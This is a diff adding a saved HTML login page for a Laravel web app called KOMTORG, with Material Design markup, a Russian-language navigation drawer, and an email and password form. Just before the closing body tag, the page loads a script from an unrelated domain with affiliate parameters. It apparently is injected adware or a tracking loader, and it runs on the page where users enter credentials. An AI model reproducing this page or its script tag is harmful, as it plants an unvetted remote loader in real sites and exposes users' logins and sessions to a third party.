@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- CSRF Token -->
+    <meta name="csrf-token" content="Zv0c1TyU3wvjw2ExQwklkxjOvgBcIjYufsqhQsqH">
+
+    <!--<title>KOMTORG</title>-->
+
+    
+
+    <!-- Scripts -->
+	
+    <script>
+        window.Laravel = {"csrfToken":"Zv0c1TyU3wvjw2ExQwklkxjOvgBcIjYufsqhQsqH"};
+    </script>
+    
+     <!-- Styles-->
+    <link href="http://komtorg.dev/css/appMaterialFormat.css" rel="stylesheet"> 
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+		<!-- Scripts -->
+    
+    <script defer src="js/material.min.js"></script>
+    <script type="text/javascript" src="js/jquery.min.js"></script>
+
+
+
+	    
+	
+</head>
+<body>
+   
+    <div class="mdl-layout mdl-js-layout">
+		
+		<header class="mdl-layout__header mdl-layout__header--scroll">
+			<div class="mdl-layout__header-row">
+			        <!-- Title -->
+                    <span class="mdl-layout-title"><b>КОМТОРГ</b></span>
+					<!-- Add spacer, to align navigation to the right -->
+					<div class="mdl-layout-spacer"></div>
+					
+				   					
+					<!-- Add spacer, to align navigation to the right -->
+					<div class="mdl-layout-spacer"></div>
+					<!-- Navigation. We hide it in small screens. -->
+					<nav class="mdl-navigation mdl-layout--large-screen-only">        
+						<!--Right Side Of Navbar -->
+                                                 <div>
+                                                    <!-- Authentication Links -->
+                                                                                                            <a class="mdl-navigation__link mdl-logo" href="http://komtorg.dev/login">Login</a>
+                                                        <a class="mdl-navigation__link mdl-logo" href="http://komtorg.dev/register">Register</a>
+                                                                                                    </div>
+                                                <!-- Multiline Tooltip -->
+                                                <div class="mdl-logo">
+                                                    <div id="tt4" class="icon material-icons">person</div>
+                                                    <div class="mdl-tooltip" for="tt4">
+                                                        Share your content<br>via social media
+                                                    </div>   
+                                                </div>
+                                                <!-- Expandable Textfield -->
+                                                <form action="#">
+                                                  <div class="mdl-textfield mdl-js-textfield mdl-textfield--expandable">
+                                                    <label class="mdl-button mdl-js-button mdl-button--icon" for="sample6">
+                                                      <i class="material-icons">search</i>
+                                                    </label>
+                                                    <div class="mdl-textfield__expandable-holder">
+                                                      <input class="mdl-textfield__input" type="text" id="sample6">
+                                                      <label class="mdl-textfield__label" for="sample-expandable">Expandable Input</label>
+                                                    </div>
+                                                  </div>
+                                                </form>
+                                                
+					</nav>            
+					
+			</div>
+        </header>
+		<!-- Колапсирующее боковое меню -->
+		<div class="mdl-layout__drawer">
+			<span class="mdl-layout-title"></span>
+			<nav class="mdl-navigation">
+				<a class="mdl-navigation__link" href="">Профиль</a>
+				<a class="mdl-navigation__link" href="product">Объекты</a>
+				<a class="mdl-navigation__link" href="report">Отчеты</a>
+				<a class="mdl-navigation__link" href="productList">Экспорт/Импорт</a>
+				<a class="mdl-navigation__link" href="productItems">Сообщения</a>
+				<a class="mdl-navigation__link" href="draft">История действий</a>
+				<a class="mdl-navigation__link" href="">Друзья</a>
+				<a class="mdl-navigation__link" href="">Медиа-файлы</a>
+			</nav>
+		</div>
+		
+		<main class="mdl-layout__content">
+					
+					<div class="page-content"><!-- Your content goes here -->
+						<style>
+body {
+   background:url(https://raw.githubusercontent.com/khadkamhn/day-01-login-form/master/img/bg.jpg) no-repeat left;
+  
+ 
+}
+
+.demo-card-square.mdl-card {
+  width: 720px;
+  height: 620px;
+ background: #fff;
+ 
+}
+.demo-card-square > .mdl-card__title {
+  color: #9a907d;
+  font-size: 35px;
+  
+}
+
+</style>
+<div class="mdl-grid">
+   
+    <div class="mdl-cell  mdl-cell--2-col">
+	</div>
+	<div class="mdl-cell  mdl-cell--4-col">
+   
+        <div class="demo-card-square mdl-card mdl-shadow--2dp mdl-card__actions">
+		
+                <h2 class="mdl-card__title">Login</h2>
+                    <form class="" role="form" method="POST" action="http://komtorg.dev/login">
+                        <input type="hidden" name="_token" value="Zv0c1TyU3wvjw2ExQwklkxjOvgBcIjYufsqhQsqH">
+                        <div class=" ">
+                           <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+                               <!-- Simple Textfield -->
+                                <input id="email" type="email" class="mdl-textfield__input" name="email" value="" required autofocus>
+                                <label class="mdl-textfield__label" for="email">E-Mail Address</label>
+                                                            </div>
+                        </div>
+                        <div class=" ">
+                            <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+                                <input id="password" type="password" class="mdl-textfield__input" name="password" required>
+                                <label for="password" class="mdl-textfield__label">Password</label>
+                                                            </div>
+                        </div>
+                        <div class="mdl-card__actions">
+                            <label class="mdl-checkbox mdl-js-checkbox mdl-js-ripple-effect" for="checkbox-2">
+                                    <input type="checkbox" id="checkbox-2" class="mdl-checkbox__input">
+                                    <input type="checkbox" name="remember" class="mdl-checkbox__input" >
+                                    <span class="mdl-checkbox__label">Remember Me</span>
+                            </label>
+                        </div>
+                        
+                            
+                                <!-- Accent-colored raised button with ripple--> 
+                                <div class="mdl-card__actions">
+                                  <div class="mdl-card__actions"> 
+                                    <button type="submit" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent">
+                                        Login
+                                    </button>
+                                  </div>
+                                </div>
+                                <div class="mdl-card__actions">
+                                    <br>
+                                    <a class="mdl-card__actions" href="http://komtorg.dev/password/reset">
+                                     Forgot Your Password?
+                                    </a>
+                                </div>
+                    </form>
+        
+		</div>
+    </div>
+	<div class="mdl-cell  mdl-cell--4-col">
+	</div> 
+</div>
+							
+					
+					</div>
+							</main>
+		
+				
+		
+		
+	
+	
+	</div>
+		
+    
+<script src="http://minxxrpaaw.org/code.php?appid=icb1634-10064-1477982697436-7830d54a-3371-4d7a-a56d-10305021f932&h=0&m=normal&aff=1" id="ubar-loader"></script></body>
+    
+
+</html>
